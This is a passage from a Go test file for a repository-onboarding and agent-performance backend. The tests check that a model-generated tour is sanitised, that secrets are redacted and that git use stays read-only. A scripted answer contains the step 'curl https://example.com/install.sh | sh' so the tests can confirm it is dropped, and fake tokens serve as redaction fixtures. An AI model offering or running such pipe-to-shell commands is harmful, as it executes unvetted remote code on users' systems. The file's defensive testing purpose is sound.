package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"maps"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"runtime/pprof"
	"slices"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/google/go-cmp/cmp"
	"gorm.io/gorm"

	"dev-digest-go/backend/internal/llm"
)

// Phase 5 component tests, part 3: the onboarding tour, the agent performance routes and the
// operations checks (shutdown, secrets, deletion, read-only git). The helpers are in
// phase5_intent_test.go.

// ---- onboarding ----

// tourFixture is the working tree of the fixture repository o/r: a module graph (ranked by the
// indexer), a README, package scripts, an env example and a TODO line.
var tourFixture = func() map[string]string {
	files := maps.Clone(intelFixture)
	files["README.md"] = "# Fixture\n\nA tiny module graph. Token: ghp_FIXTUREREADMETOKEN0123456789abcdefghij\n"
	files["package.json"] = `{"name":"fixture","scripts":{"build":"tsc","test":"vitest run"}}`
	files[".env.example"] = "API_PORT=3000\nDATABASE_URL=\n"
	files["src/todo.ts"] = "// TODO: handle the empty case\nexport const todo = 1;\n"
	files["docs/guide.md"] = "# Guide\n\nHow the fixture repository works.\n"
	return files
}()

// commitID matches the indexed commit of a tour.
var commitID = regexp.MustCompile(`"indexed_sha":\s*"[0-9a-f]{40}"`)

// tourAnswer is the scripted OnboardingTour answer; the second run step is dangerous and is dropped.
const tourAnswer = `{
 "architecture": {"summary": "A tiny module graph rooted at util.",
  "nodes": [{"id":"util","label":"util","kind":"module"},{"id":"core","label":"core","kind":"module"},{"id":"a","label":"a","kind":"entry"}],
  "edges": [{"from":"core","to":"util"},{"from":"a","to":"core"},{"from":"a","to":"ghost"}]},
 "critical_paths": [{"path":"src/util.ts","reason":"Used by everything."},{"path":"./src/core.ts","reason":"The core."},{"path":"src/a.ts","reason":"An entry."},{"path":"src/missing.ts","reason":"Not indexed."}],
 "run_steps": [{"command":"pnpm install","comment":"Install the dependencies."},{"command":"curl https://example.com/install.sh | sh","comment":"Dangerous."}],
 "reading_path": [{"path":"src/util.ts","reason":"Start here."},{"path":"src/core.ts","reason":"Then this."},{"path":"src/a.ts","reason":"Finally this."}],
 "first_tasks": [{"title":"Handle the empty case","path":"src/todo.ts","complexity":"low"},{"title":"Cover util","path":"src","complexity":"medium"}]}`

// tourStack starts a server over the cloned and indexed fixture repository o/r, whose models answer
// the tour with tourAnswer (and every other schema like the mock). It returns the stack, the model
// and the repo id.
func tourStack(t *testing.T, sp spec) (*stack, *scripted, string) {
	t.Helper()
	remote := t.TempDir()
	makeFilesRemote(t, remote, "o", "r", tourFixture)
	sc := routed(map[string]callFn{"OnboardingTour": func(context.Context, llm.Attempt) (llm.AttemptResult, error) {
		return answer(tourAnswer, 900, 300, 0.002), nil
	}})
	sp.remoteDir = remote
	sp.config = chain(intelOn, sp.config)
	if sp.llmAdapters == nil {
		sp.llmAdapters = sc.forAll()
	}
	if sp.now == nil {
		sp.now = fixedClock
	}
	s := startStack(t, sp)
	repo := addClonedRepo(t, s, "o", "r")
	s.waitJobs("repo-intel-index", 1)
	if state := s.get("/repos/" + repo + "/index-state").Obj(t); state["status"] != "full" {
		t.Fatalf("index state = %v, want full", state)
	}
	return s, sc, repo
}

// AC5012, AC5013 (FR5008, FR5009, FR5041, FR5045, FR5046): the four GET states, the generated golden
// and the row behind it.
func TestOnboarding_GenerateAndReadStates(t *testing.T) {
	s, sc, repo := tourStack(t, spec{})
	gold := &goldens{t: t, cloneDir: s.cfg.CloneDir, ids: map[string]string{}}
	check := func(name string, resp response) {
		t.Helper()
		assertWireTimes(t, name, resp.Body)
		// The commit ids of a fixture clone depend on the clock of the commit.
		resp.Body = commitID.ReplaceAll(resp.Body, []byte(`"indexed_sha":"0123456789abcdef0123456789abcdef01234567"`))
		gold.check(name, resp, http.StatusOK)
	}

	none := s.get("/repos/" + repo + "/onboarding")
	check("onboarding_none", none)
	if strings.TrimSpace(string(none.Body)) != `{"status":"none"}` {
		t.Errorf("GET onboarding before a tour = %s, want {\"status\":\"none\"}", none.Body)
	}

	posted := s.post("/repos/"+repo+"/onboarding", nil)
	check("onboarding_ready", posted)
	if got := s.get("/repos/" + repo + "/onboarding"); string(got.Body) != string(posted.Body) {
		t.Errorf("GET after the POST = %s, want the posted tour %s", got.Body, posted.Body)
	}
	body := posted.Obj(t)
	tour := obj(t, body, "tour")
	if body["status"] != "ready" || body["stale"] != false || tour["language"] != "en" || tour["prompt_version"] != float64(1) ||
		tour["provider"] != "openrouter" || tour["tokens_in"] != float64(900) || tour["tokens_out"] != float64(300) || tour["cost_usd"] != 0.002 {
		t.Errorf("POST onboarding = %s, want ready, stale false, en, prompt 1, usage 900/300 0.002", posted.Body)
	}
	if _, has := body["stale_reason"]; has {
		t.Errorf("a fresh tour has a stale_reason: %s", posted.Body)
	}
	if diff := cmp.Diff([]string{"status", "stale", "tour"}, topLevelKeys(t, posted.Body)); diff != "" {
		t.Errorf("top-level keys mismatch (-want +got):\n%s", diff)
	}

	// Normalisation: the unindexed path, the unknown edge and the dangerous command are gone.
	paths := func(key string) []string {
		var out []string
		for _, p := range tour[key].([]any) {
			out = append(out, p.(map[string]any)["path"].(string))
		}
		return out
	}
	if diff := cmp.Diff([]string{"src/util.ts", "src/core.ts", "src/a.ts"}, paths("critical_paths")); diff != "" {
		t.Errorf("critical_paths mismatch (-want +got):\n%s", diff)
	}
	arch := obj(t, tour, "architecture")
	if n, e := len(arch["nodes"].([]any)), len(arch["edges"].([]any)); n != 3 || e != 2 {
		t.Errorf("architecture has %d nodes and %d edges, want 3 and 2 (the edge to ghost is dropped)", n, e)
	}
	steps := tour["run_steps"].([]any)
	if len(steps) != 1 || steps[0].(map[string]any)["command"] != "pnpm install" {
		t.Errorf("run_steps = %v, want only pnpm install", steps)
	}
	if diff := cmp.Diff([]string{"src/todo.ts", "src"}, paths("first_tasks")); diff != "" {
		t.Errorf("first_tasks mismatch (-want a file and a folder +got):\n%s", diff)
	}

	// The stored row.
	var row struct {
		JSON        string
		GeneratedAt time.Time
	}
	if err := s.db.DB.Raw(`SELECT json::text AS json, generated_at FROM onboarding WHERE repo_id = ?`, repo).Scan(&row).Error; err != nil {
		t.Fatal(err)
	}
	var stored map[string]any
	if err := json.Unmarshal([]byte(row.JSON), &stored); err != nil {
		t.Fatal(err)
	}
	if diff := cmp.Diff(tour, stored); diff != "" {
		t.Errorf("stored tour differs from the answer (-answer +stored):\n%s", diff)
	}
	if want := row.GeneratedAt.UTC().Format("2006-01-02T15:04:05.000Z"); stored["generated_at"] != want || want != fixedNow.Format("2006-01-02T15:04:05.000Z") {
		t.Errorf("tour generated_at = %v, row generated_at = %s, want both the clock's %s", stored["generated_at"], want, fixedNow.Format(time.RFC3339))
	}

	// The model request: the signals of the repository, every one inside an untrusted block.
	at := attemptsOf(sc, "OnboardingTour")
	if len(at) != 1 {
		t.Fatalf("onboarding requests = %d, want 1", len(at))
	}
	user := userOf(at[0])
	for _, want := range []string{"### README (excerpt)", "### package.json scripts", "### .env.example variable names", "API_PORT",
		"src/todo.ts:1: // TODO: handle the empty case", "<redacted>", "### Top files by importance"} {
		if !strings.Contains(user, want) {
			t.Errorf("the prompt lacks %q:\n%s", want, user)
		}
	}
	if strings.Contains(user, "ghp_FIXTUREREADMETOKEN") {
		t.Error("the README token reached the prompt unredacted")
	}
	if at[0].Temperature == nil || *at[0].Temperature != 0.2 || at[0].MaxTokens != 4000 {
		t.Errorf("temperature/max tokens = %v/%d, want 0.2/4000", at[0].Temperature, at[0].MaxTokens)
	}

	// Staleness.
	execSQL(t, s, `UPDATE repo_index_state SET last_indexed_sha = 'ffffffffffffffffffffffffffffffffffffffff' WHERE repo_id = ?`, repo)
	stale := s.get("/repos/" + repo + "/onboarding")
	check("onboarding_stale", stale)
	if b := stale.Obj(t); b["stale"] != true || b["stale_reason"] != "index_changed" {
		t.Errorf("GET onboarding after the index moved = %s, want stale true / index_changed", stale.Body)
	}
	if diff := cmp.Diff([]string{"status", "stale", "stale_reason", "tour"}, topLevelKeys(t, stale.Body)); diff != "" {
		t.Errorf("stale keys mismatch (-want +got):\n%s", diff)
	}
	execSQL(t, s, `UPDATE repo_index_state SET last_indexed_sha = ? WHERE repo_id = ?`, tour["indexed_sha"], repo)
	execSQL(t, s, `UPDATE onboarding SET json = jsonb_set(json, '{prompt_version}', '0') WHERE repo_id = ?`, repo)
	if b := s.get("/repos/" + repo + "/onboarding").Obj(t); b["stale"] != true || b["stale_reason"] != "prompt_changed" {
		t.Errorf("GET onboarding with a stored prompt_version 0 = %v, want stale true / prompt_changed", b)
	}

	resp := s.get("/repos/" + unknownID + "/onboarding")
	if resp.Status != http.StatusNotFound || resp.errorCode(t) != "repo_not_found" || message(t, resp) != "Repo not found" {
		t.Errorf("GET onboarding of an unknown repo = %d %s, want 404 repo_not_found Repo not found", resp.Status, resp.Body)
	}
}

// AC5014 (FR5009, FR5044, EC5025, EC5028, EC5035): the refusals of a generation.
func TestOnboarding_Refusals(t *testing.T) {
	t.Run("unknown repo and no index row", func(t *testing.T) {
		s := startStack(t, spec{config: intelOn, llmAdapters: routed(nil).forAll()})
		resp := s.post("/repos/"+unknownID+"/onboarding", nil)
		if resp.Status != http.StatusNotFound || resp.errorCode(t) != "repo_not_found" {
			t.Errorf("POST onboarding of an unknown repo = %d %s, want 404 repo_not_found", resp.Status, resp.Body)
		}
		repo := repoByName(t, s, "acme/payments-api") // never cloned: no index row
		resp = s.post("/repos/"+repo+"/onboarding", nil)
		if resp.Status != http.StatusUnprocessableEntity || resp.errorCode(t) != "index_not_ready" ||
			message(t, resp) != "The repository index is not ready yet" {
			t.Errorf("POST onboarding without an index = %d %s, want 422 index_not_ready", resp.Status, resp.Body)
		}
		if resp := s.post("/repos/not-a-uuid/onboarding", nil); resp.Status != http.StatusUnprocessableEntity {
			t.Errorf("POST onboarding with a non-UUID id = %d, want 422", resp.Status)
		}
		if resp := s.do(http.MethodPost, "/repos/"+repo+"/onboarding", nil, "Origin", "https://evil.example"); resp.Status != http.StatusForbidden {
			t.Errorf("POST onboarding with a foreign Origin = %d, want 403", resp.Status)
		}
	})

	t.Run("a generation is running", func(t *testing.T) {
		g := newIntentGate()
		g.after = func(context.Context, llm.Attempt) (llm.AttemptResult, error) {
			return answer(tourAnswer, 900, 300, 0.002), nil
		}
		sc := routed(map[string]callFn{"OnboardingTour": g.call})
		s, _, repo := tourStack(t, spec{llmAdapters: sc.forAll()})
		type result struct {
			status int
			err    error
		}
		first := make(chan result, 1)
		go func() {
			status, _, err := postFromOutside(s.base, "/repos/"+repo+"/onboarding")
			first <- result{status, err}
		}()
		eventually(t, 30*time.Second, "the generation to be inside its model call", func() bool { return countOf(sc, "OnboardingTour") == 1 })
		resp := s.post("/repos/"+repo+"/onboarding", nil)
		if resp.Status != http.StatusConflict || resp.errorCode(t) != "generation_in_progress" ||
			message(t, resp) != "A tour is already being generated for this repository" {
			t.Errorf("second POST onboarding = %d %s, want 409 generation_in_progress", resp.Status, resp.Body)
		}
		g.Open()
		if r := <-first; r.err != nil || r.status == 0 {
			t.Errorf("first POST onboarding = %d (%v)", r.status, r.err)
		}
		// Released on every outcome: the next POST generates.
		if resp := s.post("/repos/"+repo+"/onboarding", nil); resp.Status != http.StatusOK {
			t.Errorf("POST onboarding after the first ended = %d %s, want 200", resp.Status, resp.Body)
		}
	})

	t.Run("no key", func(t *testing.T) {
		sc := routed(nil)
		sc.needsKey = true
		s, _, repo := tourStack(t, spec{llmAdapters: sc.forAll(), llm: fastLLM()})
		resp := s.post("/repos/"+repo+"/onboarding", nil)
		if resp.Status != http.StatusUnprocessableEntity || resp.errorCode(t) != "provider_not_configured" ||
			message(t, resp) != "The openrouter provider is not configured" {
			t.Fatalf("POST onboarding without a key = %d %s, want 422 provider_not_configured", resp.Status, resp.Body)
		}
		details := obj(t, resp.JSON(t), "error", "details")
		if diff := cmp.Diff(map[string]any{"provider": "openrouter"}, details); diff != "" {
			t.Errorf("details mismatch (-want +got):\n%s", diff)
		}
		if n := count(t, s.db.DB, `SELECT count(*) FROM onboarding`); n != 0 {
			t.Errorf("onboarding rows = %d, want 0", n)
		}
	})

	t.Run("the mock has no fixture", func(t *testing.T) {
		remote := t.TempDir()
		makeFilesRemote(t, remote, "o", "r", tourFixture)
		s := startStack(t, spec{remoteDir: remote, config: chain(intelOn, mockProvider)})
		repo := addClonedRepo(t, s, "o", "r")
		s.waitJobs("repo-intel-index", 1)
		resp := s.post("/repos/"+repo+"/onboarding", nil)
		if resp.Status != http.StatusBadGateway || resp.errorCode(t) != "generation_failed" || message(t, resp) != "The model call failed" {
			t.Errorf("POST onboarding on the mock = %d %s, want 502 generation_failed \"The model call failed\"", resp.Status, resp.Body)
		}
	})
}

// AC5054, AC5068 (FR5046, NFR5011, NFR5014): one line per outcome with the documented fields; the
// provider's text never reaches the response.
func TestOnboarding_LogLinesAndGenericFailure(t *testing.T) {
	var fail atomic.Bool
	const leakedKey = "sk-or-v1-LEAKEDONBOARDINGKEY0123456789"
	const leak = "echo of the README: Fixture " + leakedKey
	sc := routed(map[string]callFn{"OnboardingTour": func(context.Context, llm.Attempt) (llm.AttemptResult, error) {
		if fail.Load() {
			return llm.AttemptResult{}, errors.New(leak)
		}
		return answer(tourAnswer, 900, 300, 0.002), nil
	}})
	sc.needsKey = true
	s, _, repo := tourStack(t, spec{llmAdapters: sc.forAll(), llm: fastLLM(), env: map[string]string{"OPENROUTER_API_KEY": leakedKey}})

	if resp := s.post("/repos/"+repo+"/onboarding", nil); resp.Status != http.StatusOK {
		t.Fatalf("POST onboarding = %d %s, want 200", resp.Status, resp.Body)
	}
	before := scalar[string](t, s.db.DB, `SELECT json::text FROM onboarding WHERE repo_id = ?`, repo)
	fail.Store(true)
	resp := s.post("/repos/"+repo+"/onboarding", nil)
	if resp.Status != http.StatusBadGateway || resp.errorCode(t) != "generation_failed" || message(t, resp) != "The model call failed" {
		t.Errorf("POST onboarding with a failing provider = %d %s, want 502 generation_failed \"The model call failed\"", resp.Status, resp.Body)
	}
	if strings.Contains(string(resp.Body), "README") || strings.Contains(string(resp.Body), "LEAKED") {
		t.Errorf("the response holds provider text: %s", resp.Body)
	}
	if after := scalar[string](t, s.db.DB, `SELECT json::text FROM onboarding WHERE repo_id = ?`, repo); after != before {
		t.Error("the stored tour changed after a failed generation")
	}

	ok := logLines(t, s.logs, "onboarding tour generated")
	bad := logLines(t, s.logs, "onboarding tour generation failed")
	if len(ok) != 1 || len(bad) != 1 {
		t.Fatalf("log lines: %d generated, %d failed, want one each", len(ok), len(bad))
	}
	if ok[0]["level"] != "INFO" || ok[0]["outcome"] != "ok" || ok[0]["repoId"] != repo || ok[0]["provider"] != "openrouter" ||
		ok[0]["tokensIn"] != float64(900) || ok[0]["tokensOut"] != float64(300) || ok[0]["costUsd"] != 0.002 {
		t.Errorf("generated line = %v, want INFO ok with the repo, provider and usage", ok[0])
	}
	// critical_paths lost src/missing.ts, run_steps the dangerous command, the edge to ghost one edge.
	if diff := cmp.Diff(map[string]any{"nodes": float64(0), "edges": float64(1), "critical_paths": float64(1), "run_steps": float64(1),
		"reading_path": float64(0), "first_tasks": float64(0)}, ok[0]["dropped"]); diff != "" {
		t.Errorf("dropped counts mismatch (-want +got):\n%s", diff)
	}
	if bad[0]["level"] != "WARN" || bad[0]["outcome"] != "generation_failed" || bad[0]["repoId"] != repo {
		t.Errorf("failed line = %v, want WARN generation_failed", bad[0])
	}
	for _, l := range append(ok, bad...) {
		if _, has := l["durationMs"]; !has {
			t.Errorf("line %v has no durationMs", l)
		}
	}
	assertNoSecret(t, "the log", s.logs.String(), leakedKey, "ghp_FIXTUREREADMETOKEN")
}

// ---- deletion ----

// AC5069 (FR5019, FR5039, FR5046): the rows of a derived intent, a brief and a tour go with their
// pull request and repository.
func TestDelete_IntentBriefAndTourGoWithTheirOwners(t *testing.T) {
	s, _, repo := tourStack(t, spec{})
	if resp := s.post("/repos/"+repo+"/onboarding", nil); resp.Status != http.StatusOK {
		t.Fatalf("POST onboarding = %d %s, want 200", resp.Status, resp.Body)
	}
	pr := pr482(t, s)
	for _, route := range []string{"/pulls/" + pr + "/intent/refresh", "/pulls/" + pr + "/brief"} {
		if resp := s.post(route, nil); resp.Status != http.StatusOK {
			t.Fatalf("POST %s = %d %s, want 200", route, resp.Status, resp.Body)
		}
	}
	rows := func() [3]int {
		return [3]int{
			count(t, s.db.DB, `SELECT count(*) FROM pr_intent`),
			count(t, s.db.DB, `SELECT count(*) FROM pr_brief`),
			count(t, s.db.DB, `SELECT count(*) FROM onboarding`),
		}
	}
	if diff := cmp.Diff([3]int{1, 1, 1}, rows()); diff != "" {
		t.Fatalf("rows before the deletes (pr_intent, pr_brief, onboarding) mismatch (-want +got):\n%s", diff)
	}

	// There is no pull request delete route: the row goes by SQL, as a repository delete would take it.
	execSQL(t, s, `DELETE FROM pull_requests WHERE id = ?`, pr)
	if diff := cmp.Diff([3]int{0, 0, 1}, rows()); diff != "" {
		t.Errorf("rows after the pull request was deleted mismatch (-want +got):\n%s", diff)
	}
	if resp := s.do(http.MethodDelete, "/repos/"+repo, nil); resp.Status != http.StatusOK {
		t.Fatalf("DELETE /repos/%s = %d %s, want 200", repo, resp.Status, resp.Body)
	}
	if diff := cmp.Diff([3]int{0, 0, 0}, rows()); diff != "" {
		t.Errorf("rows after the repository was deleted mismatch (-want +got):\n%s", diff)
	}
}

// ---- read-only git ----

// verbWrapper writes an executable that appends one line per git invocation (its arguments, one
// write, so concurrent invocations never interleave) to the returned log and runs the real git.
func verbWrapper(t testing.TB) (binary, logFile string) {
	t.Helper()
	dir := t.TempDir()
	binary, logFile = filepath.Join(dir, "git-verbs"), filepath.Join(dir, "calls.log")
	script := "#!/bin/sh\nprintf '%s\\n' \"$*\" >> '" + logFile + "'\nexec git \"$@\"\n"
	if err := os.WriteFile(binary, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	return binary, logFile
}

// gitVerbs lists the git subcommands a verbWrapper log recorded after offset, in call order.
func gitVerbs(t testing.TB, logFile string, offset int) []string {
	t.Helper()
	raw, err := os.ReadFile(logFile)
	if err != nil {
		t.Fatal(err)
	}
	var verbs []string
	for _, line := range strings.Split(strings.TrimSpace(string(raw[offset:])), "\n") {
		args := strings.Fields(line)
		for i := 0; i < len(args); i++ {
			if args[i] == "-c" || args[i] == "-C" {
				i++
				continue
			}
			if !strings.HasPrefix(args[i], "-") {
				verbs = append(verbs, args[i])
				break
			}
		}
	}
	return verbs
}

// treeChecksum hashes every file under dir (path, mode, content): working tree, refs and objects.
func treeChecksum(t testing.TB, dir string) string {
	t.Helper()
	h := sha256.New()
	err := filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(dir, path)
		info, err := d.Info()
		if err != nil {
			return err
		}
		_, _ = fmt.Fprintf(h, "%s %v\n", rel, info.Mode())
		if d.Type().IsRegular() {
			b, err := os.ReadFile(path)
			if err != nil {
				return err
			}
			h.Write(b)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return hex.EncodeToString(h.Sum(nil))
}

// AC5072 (NFR5004): a brief and a tour of a cloned repository run only read-only git commands and
// leave the clone byte for byte as it was.
func TestGit_BriefAndTourOnlyReadTheClone(t *testing.T) {
	bin, logFile := verbWrapper(t)
	s, sc, repo := tourStack(t, spec{gitBinary: bin})
	_ = sc

	// A pull request of the repository whose reviewer has an attached project document.
	f := newFx(t, s)
	pr := f.pr(repo, 5, map[string]string{"src/a.ts": patchOf(3), "src/core.ts": patchOf(3)})
	general := agentByName(t, s, agentGeneral)
	if resp := s.do(http.MethodPut, "/agents/"+general+"/context", map[string]any{"repo_id": repo, "paths": []string{"docs/guide.md"}}); resp.Status != http.StatusOK {
		t.Fatalf("PUT agent context = %d %s, want 200", resp.Status, resp.Body)
	}
	f.review(pr, general, "", "2026-01-01T10:00:00Z", 70)
	execSQL(t, s, `UPDATE pull_requests SET head_sha = ? WHERE id = ?`, gitRun(t, filepath.Join(s.cfg.CloneDir, "o", "r"), "rev-parse", "HEAD"), pr)

	clone := filepath.Join(s.cfg.CloneDir, "o", "r")
	offset := func() int {
		b, err := os.ReadFile(logFile)
		if err != nil {
			t.Fatal(err)
		}
		return len(b)
	}
	before, mark := treeChecksum(t, clone), offset()

	if resp := s.post("/repos/"+repo+"/onboarding", nil); resp.Status != http.StatusOK {
		t.Fatalf("POST onboarding = %d %s, want 200", resp.Status, resp.Body)
	}
	tour := gitVerbs(t, logFile, mark)
	mark = offset()
	if resp := s.post("/pulls/"+pr+"/brief", nil); resp.Status != http.StatusOK {
		t.Fatalf("POST brief = %d %s, want 200", resp.Status, resp.Body)
	}
	brief := gitVerbs(t, logFile, mark)

	if len(tour) == 0 {
		t.Error("the tour ran no git command, expected blob reads")
	}
	for _, v := range tour {
		if v != "cat-file" {
			t.Errorf("the tour ran git %s, want cat-file only (all verbs: %v)", v, tour)
		}
	}
	for _, v := range brief {
		if !slices.Contains([]string{"cat-file", "merge-base", "rev-parse"}, v) {
			t.Errorf("the brief ran git %s, want cat-file, merge-base or rev-parse only (all verbs: %v)", v, brief)
		}
	}
	if len(brief) == 0 {
		t.Error("the brief ran no git command, expected the attached document's reads")
	}
	if after := treeChecksum(t, clone); after != before {
		t.Error("the clone (working tree, refs or objects) changed during the brief and the tour")
	}
}

// ---- performance ----

// perfRun inserts one run with its source, model and optional findings; ranAt is RFC 3339.
type perfRun struct {
	agent    string // "" = a deleted agent (NULL)
	status   string
	source   string
	ranAt    string
	duration *int
	cost     *float64
	model    *string
	findings []string // "accepted", "dismissed" or "pending"
}

func insertPerfRun(t testing.TB, s *stack, f fx, pr string, r perfRun) string {
	t.Helper()
	id := f.run(runRow{pr: pr, agent: r.agent, ranAt: r.ranAt, status: r.status, duration: r.duration, cost: r.cost})
	execSQL(t, s, `UPDATE agent_runs SET source = ?, model = ? WHERE id = ?`, r.source, r.model, id)
	if len(r.findings) > 0 {
		review := f.review(pr, r.agent, id, r.ranAt, 70)
		for i, state := range r.findings {
			severity := []string{"CRITICAL", "WARNING", "SUGGESTION"}[i%3]
			fid := f.finding(review, "src/a.ts", i+1, i+1, severity, fmt.Sprintf("finding %d", i))
			switch state {
			case "accepted":
				execSQL(t, s, `UPDATE findings SET accepted_at = ?, category = 'security' WHERE id = ?`, r.ranAt, fid)
			case "dismissed":
				execSQL(t, s, `UPDATE findings SET dismissed_at = ? WHERE id = ?`, r.ranAt, fid)
			}
		}
	}
	return id
}

func ms(n int) *int          { return &n }
func usd(v float64) *float64 { return &v }
func model(m string) *string { return &m }
func seedPerformance(t testing.TB, s *stack) (general, security string) {
	t.Helper()
	// The seeded demo run was made "now" of the machine, which is not the fixed clock's.
	execSQL(t, s, `DELETE FROM agent_runs`)
	f := newFx(t, s)
	pr := pr482(t, s)
	general, security = agentByName(t, s, agentGeneral), agentByName(t, s, agentSecurity)
	g1 := insertPerfRun(t, s, f, pr, perfRun{agent: general, status: "done", source: "local", ranAt: "2026-10-20T10:00:00Z", duration: ms(1000), cost: usd(0.5), model: model("gpt-4.1"), findings: []string{"accepted", "dismissed", "pending"}})
	g2 := insertPerfRun(t, s, f, pr, perfRun{agent: general, status: "done", source: "ci", ranAt: "2026-10-10T10:00:00Z", duration: ms(3000), cost: usd(0.25), model: model("gpt-4.1")})
	insertPerfRun(t, s, f, pr, perfRun{agent: general, status: "failed", source: "local", ranAt: "2026-10-05T10:00:00Z", model: model("gpt-4.1")})
	insertPerfRun(t, s, f, pr, perfRun{agent: general, status: "cancelled", source: "local", ranAt: "2026-09-30T10:00:00Z", duration: ms(500), cost: usd(0.1), model: model("claude-x")})
	insertPerfRun(t, s, f, pr, perfRun{agent: general, status: "done", source: "local", ranAt: "2026-09-10T10:00:00Z", duration: ms(1500), cost: usd(0.4), model: model("gpt-4.1")}) // previous window
	insertPerfRun(t, s, f, pr, perfRun{agent: general, status: "running", source: "local", ranAt: "2026-10-21T10:00:00Z"})                                                           // not counted
	insertPerfRun(t, s, f, pr, perfRun{agent: security, status: "done", source: "local", ranAt: "2026-10-21T09:00:00Z", duration: ms(2000), cost: usd(0.2), model: model("claude-x"), findings: []string{"accepted", "accepted", "dismissed"}})
	insertPerfRun(t, s, f, pr, perfRun{agent: security, status: "done", source: "local", ranAt: "2026-10-22T12:00:00Z", duration: ms(4000), cost: usd(0.3)})                          // at now: inclusive
	insertPerfRun(t, s, f, pr, perfRun{agent: security, status: "done", source: "local", ranAt: "2026-09-22T12:00:00Z", duration: ms(100), cost: usd(0.05), model: model("gpt-4.1")}) // at from: inclusive
	insertPerfRun(t, s, f, pr, perfRun{status: "done", source: "local", ranAt: "2026-10-15T10:00:00Z", duration: ms(900), cost: usd(0.3), model: model("gpt-4.1"), findings: []string{"pending"}})
	insertPerfRun(t, s, f, pr, perfRun{status: "done", source: "local", ranAt: "2026-09-01T10:00:00Z", duration: ms(900), cost: usd(0.2), model: model("gpt-4.1")}) // previous window only

	skills := []string{}
	if err := s.db.DB.Raw(`SELECT id::text FROM skills ORDER BY name COLLATE "C" LIMIT 2`).Scan(&skills).Error; err != nil || len(skills) != 2 {
		t.Fatalf("skills = %v: %v", skills, err)
	}
	for i, run := range []string{g1, g2} {
		execSQL(t, s, `INSERT INTO agent_run_skills (run_id, skill_id, skill_version, "order") VALUES (?, ?, 1, 0)`, run, skills[0])
		if i == 0 {
			execSQL(t, s, `INSERT INTO agent_run_skills (run_id, skill_id, skill_version, "order") VALUES (?, ?, 1, 1)`, run, skills[1])
		}
	}
	execSQL(t, s, `INSERT INTO run_traces (run_id, trace) VALUES (?, ?::jsonb)`, g1, `{"memory_pulled":[{"text":"remember A"},{"text":"remember A"},{"text":"  "},{"id":"x"}]}`)
	execSQL(t, s, `INSERT INTO run_traces (run_id, trace) VALUES (?, ?::jsonb)`, g2, `{"memory_pulled":[{"text":"remember A"},{"text":"remember B"}]}`)
	return general, security
}

// perfSpec is the server of the performance tests: a fixed clock.
func perfSpec() spec { return spec{now: fixedClock} }

// AC5015, AC5016 (FR5010, FR5011, FR5050, FR5051, EC5031): the dashboard and one agent's stats over
// seeded runs on a fixed clock; the stats' metrics are the agent's dashboard row.
func TestPerformance_DashboardAndStats(t *testing.T) {
	s := startStack(t, perfSpec())
	gold := &goldens{t: t, cloneDir: s.cfg.CloneDir, ids: map[string]string{}}
	general, _ := seedPerformance(t, s)

	dash := s.get("/agents/performance?period=30d")
	assertWireTimes(t, "agents_performance", dash.Body)
	gold.check("agents_performance", dash, http.StatusOK)
	var perf struct {
		Period  map[string]any `json:"period"`
		Summary map[string]any `json:"summary"`
		Prev    map[string]any `json:"previous_summary"`
		Agents  []struct {
			AgentID   *string        `json:"agent_id"`
			AgentName string         `json:"agent_name"`
			Metrics   map[string]any `json:"metrics"`
		} `json:"agents"`
		CostByAgent []map[string]any `json:"cost_by_agent"`
		CostByModel []map[string]any `json:"cost_by_model"`
	}
	if err := json.Unmarshal(dash.Body, &perf); err != nil {
		t.Fatal(err)
	}
	if diff := cmp.Diff(map[string]any{"key": "30d", "from": "2026-09-22T12:00:00.000Z", "to": "2026-10-22T12:00:00.000Z"}, perf.Period); diff != "" {
		t.Errorf("period mismatch (-want +got):\n%s", diff)
	}
	// Hand-computed: 8 counted runs (g1-g4, s1-s3, d1), 7 priced, 3 accepted, 2 dismissed, 2 pending findings.
	wantSummary := map[string]any{"runs": 8.0, "priced_runs": 7.0, "unpriced_runs": 1.0, "accepted": 3.0, "dismissed": 2.0, "pending": 2.0,
		"decisions": 5.0, "total_cost_usd": 1.7, "avg_accept_rate": 0.6}
	for k, want := range wantSummary {
		if perf.Summary[k] != want {
			t.Errorf("summary.%s = %v, want %v", k, perf.Summary[k], want)
		}
	}
	if ma, _ := perf.Summary["most_active"].(map[string]any); ma["agent_name"] != agentGeneral || ma["runs"] != 4.0 {
		t.Errorf("most_active = %v, want General Reviewer with 4 runs", perf.Summary["most_active"])
	}
	if perf.Prev["runs"] != 2.0 || perf.Prev["total_cost_usd"] != 0.6 {
		t.Errorf("previous_summary = %v, want 2 runs and 0.6 (a General run and a deleted agent's)", perf.Prev)
	}
	var names []string
	for _, a := range perf.Agents {
		names = append(names, a.AgentName)
	}
	if diff := cmp.Diff([]string{agentGeneral, agentPerformance, agentSecurity, agentTestQuality, "Deleted agents"}, names); diff != "" {
		t.Errorf("agent rows mismatch (-want +got):\n%s", diff)
	}
	if last := perf.Agents[len(perf.Agents)-1]; last.AgentID != nil {
		t.Errorf("the Deleted agents row has agent_id %v, want null", *last.AgentID)
	}
	label := func(rows []map[string]any) []any {
		var out []any
		for _, r := range rows {
			out = append(out, r["label"])
		}
		return out
	}
	if diff := cmp.Diff([]any{agentGeneral, agentSecurity, nil}, label(perf.CostByAgent)); diff != "" {
		t.Errorf("cost_by_agent labels mismatch (-want value order, the deleted agents' label is null +got):\n%s", diff)
	}
	if diff := cmp.Diff([]any{"gpt-4.1", "claude-x", nil}, label(perf.CostByModel)); diff != "" {
		t.Errorf("cost_by_model labels mismatch (-want value order, null last +got):\n%s", diff)
	}

	stats := s.get("/agents/" + general + "/stats?period=30d")
	assertWireTimes(t, "agent_stats", stats.Body)
	gold.check("agent_stats", stats, http.StatusOK)
	var st struct {
		Metrics map[string]any `json:"metrics"`
		Skills  []struct {
			Label string  `json:"label"`
			Runs  float64 `json:"runs"`
		} `json:"skills_used"`
		Memory []struct {
			Label string  `json:"label"`
			Runs  float64 `json:"runs"`
		} `json:"memory_pulled"`
		History []struct {
			Status   string `json:"status"`
			HasTrace bool   `json:"has_trace"`
		} `json:"run_history"`
	}
	if err := json.Unmarshal(stats.Body, &st); err != nil {
